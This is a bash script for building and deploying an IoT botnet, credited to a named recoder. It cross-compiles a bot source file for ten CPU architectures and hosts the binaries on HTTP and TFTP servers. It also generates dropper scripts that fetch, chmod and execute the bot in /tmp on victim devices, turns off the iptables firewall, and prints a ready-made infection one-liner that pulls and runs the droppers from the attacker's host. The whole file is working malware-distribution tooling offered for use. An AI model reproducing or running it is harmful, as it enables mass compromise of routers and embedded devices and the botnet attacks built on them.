#!/bin/bash
echo -e '\x1b[31m###############################################################################'
echo -e '\x1b[31m* ___     __________  ____ _______      _____ _______________.___.  ___       *'
echo -e '\x1b[31m* / _ \_/\ \______   \/_   |\      \    /  _  \\______   \__  |   | / _ \_/\  *'
echo -e '\x1b[31m* \/ \___/  |    |  _/ |   |/   |   \  /  /_\  \|       _//   |   | \/ \___/  *'
echo -e '\x1b[31m*           |    |   \ |   /    |    \/    |    \    |   \\____   |           *'
echo -e '\x1b[31m*           |______  / |___\____|__  /\____|__  /____|_  // ______|           *'
echo -e '\x1b[31m*                  \/              \/         \/       \/ \/                  *'
echo -e '\x1b[31m###############################################################################'
echo -e "\x1b[31mNSA-EDITED.sh | BUILD DATE: 6-17-16\r\n"
echo -e "\x1b[31mUsage: sh NSA-edited.sh [BOTNAME.c] DONT BE A DUMBASS AND RUN IT OTHERWISE"
yum install perl -y;yum install gcc -y;yum install gcc-c++ -y;yum install cpan -y;yum install httpd -y;yum install tftp -y;yum install screen -y;yum install nano -y;yum install unzip -y;yum install tar -y;yum install wget -y;yum install curl -y;yum install busybox -y;yum install python-paramiko -y

#########################################
###############Botnames##################
#########################################
L1='jackmymipsel' #mipsel
L2='jackmymips'  #mips
L3='jackmysh4'    #sh4
L4='jackmyx86' #x86_64
L5='jackmyarmv6' #armv6l
L6='jackmyi686'   #i686
L7='jackmypowerpc'  #powerpc
L8='jackmyi586'  #i586
L9='jackmym86k'  #m86k
L10='jackmysparc'  #sparc

#########################################
##############Wgetlinks##################
#########################################
mips='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2'
mipsel='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2'
sh4='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2'
x86_64='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2'
armv6l='http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2'
i686='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2'
ppc='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2'
i586='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2'
m68k='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2'
sparc='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2'
apt-get install tar
yum install tar -y

#########################################
################Wgetting#################
#########################################
if [ -d cross-compiler-mips ]
then
echo -e "\e[0;31mcross-compiler-mips is present, no need for wget"
else
wget --quiet $mips --no-check-certificate
tar -xvjf cross-compiler-mips*
fi
if [ -d cross-compiler-mipsel ]
then
echo -e "\e[0;31mcross-compiler-mipsel is present, no need for wget"
else
wget --quiet $mipsel --no-check-certificate
tar -xvjf cross-compiler-mipsel*
fi
if [ -d cross-compiler-sh4 ]
then
echo -e "\e[0;31mcross-compiler-sh4 is present, no need for wget"
else
wget --quiet $sh4 --no-check-certificate
tar -xvjf cross-compiler-sh4*
fi
if [ -d cross-compiler-x86_64 ]
then
echo -e "\e[0;31mcross-compiler-x86_64 is present, no need for wget"
else
wget --quiet $x86_64 --no-check-certificate
tar -xvjf cross-compiler-x86_64*
fi
if [ -d cross-compiler-armv6l ]
then
echo -e "\e[0;31mcross-compiler-armv6l is present, no need for wget"
else
wget --quiet $armv6l --no-check-certificate
tar -xvjf cross-compiler-armv6l*
fi
if [ -d cross-compiler-powerpc ]
then
echo -e "\e[0;31mcross-compiler-powerpc is present, no need for wget"
else
wget --quiet $ppc --no-check-certificate
tar -xvjf cross-compiler-powerpc*
fi
if [ -d cross-compiler-m68k ]
then
echo -e "\e[0;31mcross-compiler-m68k is present, no need for wget"
else
wget --quiet $m68k --no-check-certificate 
tar -xvjf cross-compiler-m68k*
fi
if [ -d cross-compiler-sparc ]
then
echo -e "\e[0;31mcross-compiler-sparc is present, no need for wget"
else
wget --quiet $sparc --no-check-certificate
tar -xvjf cross-compiler-sparc*
fi
if [ -d cross-compiler-i586 ]
then
echo -e "\e[0;31mcross-compiler-i586 is present, no need for wget"
else
wget --quiet $i586 --no-check-certificate
tar -xvjf cross-compiler-i586*
fi
if [ -d cross-compiler-i686 ]
then
echo -e "\e[0;31mcross-compiler-i686 is present, no need for wget"
else
wget --quiet $i686 --no-check-certificate
tar -xvjf cross-compiler-i686*
fi
rm -rf *.tar.bz2
echo -e "\x1b[31mDONE...NOW TO COMPILE THE SHIT"
sleep 3

#########################################
##############Compiling##################
#########################################
./cross-compiler-mipsel/bin/mipsel-gcc -static -lpthread -pthread -DMIPSEL -o $L1 $1 > /dev/null 2>&1
./cross-compiler-mips/bin/mips-gcc -static -lpthread -pthread -Dmips -o $L2 $1 > /dev/null 2>&1
./cross-compiler-sh4/bin/sh4-gcc -static -lpthread -pthread -Dsh4 -o $L3 $1 > /dev/null 2>&1
./cross-compiler-x86_64/bin/x86_64-gcc -static -lpthread -pthread -Dx86_64 -o $L4 $1 > /dev/null 2>&1
./cross-compiler-armv6l/bin/armv6l-gcc -static -lpthread -pthread -Darmv6l -o $L5 $1 > /dev/null 2>&1
./cross-compiler-i686/bin/i686-gcc -static -lpthread -pthread -Di686 -o $L6 $1 > /dev/null 2>&1
./cross-compiler-powerpc/bin/powerpc-gcc -static -lpthread -pthread -Dpowerpc -o $L7 $1 > /dev/null 2>&1
./cross-compiler-i586/bin/i586-gcc -static -lpthread -pthread -Di586 -o $L8 $1 > /dev/null 2>&1
./cross-compiler-m86k/bin/m86k-gcc -static -lpthread -pthread -Dm86k -o $L9 $1 > /dev/null 2>&1
./cross-compiler-sparc/bin/sparc-gcc -static -lpthread -pthread -Dsparc -o $L10 $1 > /dev/null 2>&1
apt-get install apache2; apt-get install php5 -y -q
yum install httpd; yum install php -y -q
mv jackmy* /var/www/html/
echo -e "\x1b[31mRESTARTING YOUR HTTPD BITCH"
service httpd start
service apache2 restart

#########################################
#########Setting up gtop.sh##############
#########################################
cd /var/www/html/; rm -rf gtop.sh
cd /var/www/html/; touch gtop.sh

echo -e "\x1b[31mMAKING GTOP.SH"
echo -e "\x1b[31mDONT BE LIKE CODE, AND WAIT A DAMN MINUTE!!!!"
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L1 && chmod +x $L1 && ./$L1">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L2 && chmod +x $L2 && ./$L2">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L3 && chmod +x $L3 && ./$L3">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L4 && chmod +x $L4 && ./$L4">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L5 && chmod +x $L5 && ./$L5">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L6 && chmod +x $L6 && ./$L6">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L7 && chmod +x $L7 && ./$L7">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L8 && chmod +x $L8 && ./$L8">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L9 && chmod +x $L9 && ./$L9">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L10 && chmod +x $L10 && ./$L10">> gtop.sh

yum install xinetd tftp tftp-server -y
echo -e "# default: off
# description: The tftp server serves files using the trivial file transfer \
#       protocol.  The tftp protocol is often used to boot diskless \
#       workstations, download configuration files to network-aware printers, \
#       and to start the installation process for some operating systems.
service tftp
{
        socket_type             = dgram
        protocol                = udp
        wait                    = yes
        user                    = root
        server                  = /usr/sbin/in.tftpd
        server_args             = -s -c /var/lib/tftpboot
        disable                 = no
        per_source              = 11
        cps                     = 100 2
        flags                   = IPv4
}
" >> /etc/xinetd.d/tftp
service xinetd start
cp jackmy* /var/lib/tftpboot/

#########################################
#########Setting up tftp.sh##############
#########################################
cd /var/lib/tftpboot; rm -rf tftp1.sh
cd /var/lib/tftpboot; touch tftp1.sh

echo -e "\x1b[31mMAKING TFTP1.SH"
echo -e "\x1b[31mONCE AGAIN, WAIT A DAMN MINUTE!!!!"
echo "cp /bin/busybox -O /tmp/badbox">> tftp1.sh
echo "tftp $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//') -c get $L1;cat $L1 >badbox;chmod +x *;./badbox">> tftp1.sh
echo "tftp $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//') -c get $L2;cat $L2 >badbox;chmod +x *;./badbox">> tftp1.sh
echo "tftp $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//') -c get $L3;cat $L3 >badbox;chmod +x *;./badbox">> tftp1.sh
echo "tftp $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//') -c get $L4;cat $L4 >badbox;chmod +x *;./badbox">> tftp1.sh
echo "tftp $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//') -c get $L5;cat $L5 >badbox;chmod +x *;./badbox">> tftp1.sh
echo "tftp $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//') -c get $L6;cat $L6 >badbox;chmod +x *;./badbox">> tftp1.sh
echo "tftp $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//') -c get $L7;cat $L7 >badbox;chmod +x *;./badbox">> tftp1.sh
echo "tftp $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//') -c get $L8;cat $L8 >badbox;chmod +x *;./badbox">> tftp1.sh
echo "tftp $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//') -c get $L9;cat $L9 >badbox;chmod +x *;./badbox">> tftp1.sh
echo "tftp $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//') -c get $L10;cat $L10 >badbox;chmod +x *;./badbox">> tftp1.sh

#########################################
#########Setting up tftp2.sh#############
#########################################
cd /var/lib/tftpboot; rm -rf tftp2.sh
cd /var/lib/tftpboot; touch tftp2.sh

echo -e "\x1b[31mMAKING TFTP2.SH"
echo -e "\x1b[31mFOR THE LAST TIME HOLD THE FUCK ON!!!!"
echo "cp /bin/busybox -O /tmp/badbox">> tftp2.sh
echo "tp -r $L1 -g $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//');cat $L1 >badbox;chmod +x *;./badbox">> tftp2.sh
echo "tp -r $L2 -g $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//');cat $L2 >badbox;chmod +x *;./badbox">> tftp2.sh
echo "tp -r $L3 -g $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//');cat $L3 >badbox;chmod +x *;./badbox">> tftp2.sh
echo "tp -r $L4 -g $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//');cat $L4 >badbox;chmod +x *;./badbox">> tftp2.sh
echo "tp -r $L5 -g $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//');cat $L5 >badbox;chmod +x *;./badbox">> tftp2.sh
echo "tp -r $L6 -g $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//');cat $L6 >badbox;chmod +x *;./badbox">> tftp2.sh
echo "tp -r $L7 -g $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//');cat $L7 >badbox;chmod +x *;./badbox">> tftp2.sh
echo "tp -r $L8 -g $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//');cat $L8 >badbox;chmod +x *;./badbox">> tftp2.sh
echo "tp -r $L9 -g $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//');cat $L9 >badbox;chmod +x *;./badbox">> tftp2.sh
echo "tp -r $L10 -g $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//');cat $L10 >badbox;chmod +x *;./badbox">> tftp2.sh

#########################################
###############RESTARTING SERVICES#######
#########################################
echo -e'\x1b[34mSTOPPING IPTABLES'
service iptables stop
chkconfig iptables off
echo -e'\x1b[34mRESTARTING HTTPD'
service httpd restart
echo -e'\x1b[34mRESTARTING XINETD'
service xinetd restart

#########################################
###############CREDZ#####################
#########################################
echo -e "\x1b[37mRECODED BY ~B1NARY~"
echo -e "\x1b[37mSkype: bl4ck.j3sus|XMPP: b1nary@darkness.su"
echo -e "\x1b[32mYour link: cd /tmp; wget http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/gtop.sh || curl -O http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//') -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g $(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh\r\n"

#########################################
###############ULIMIT####################
#########################################
cd /var/www/html/;rm -rf *c
cd /root
ulimit -Hn 999999; ulimit -Sn 99999
ulimit -u 999999;ulimit -n 999999
sysctl -w fs.file-max=999999 >/dev/null
echo "#.bashrc">> .bashrc
echo "#ulimit set">> .bashrc
echo "ulimit -u 999999">> .bashrc
echo "ulimit -n 999999">> .bashrc
bash
